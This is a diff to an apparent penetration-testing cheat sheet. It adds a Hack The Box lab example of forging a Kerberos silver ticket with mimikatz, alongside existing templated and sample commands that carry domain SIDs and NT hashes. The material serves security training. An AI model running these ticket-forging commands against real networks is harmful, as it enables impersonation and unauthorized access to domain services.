@@ -163,6 +163,9 @@ Get-DomainSID
 # Create a ticket for the service
 mimikatz $ kerberos::golden /user:<USERNAME> /domain:<DOMAIN.FQDN> /sid:<DOMAIN-SID> /target:<TARGET-HOST.DOMAIN.FQDN> /rc4:<TARGET-MACHINE-NT-HASH> /service:<SERVICE>
 
+# HTB Example 
+mimikatz.exe "kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.inlanefreight.local /service:cifs /ticket:sql01.kirbi"
+
 # Examples
 mimikatz $ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt
 mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park
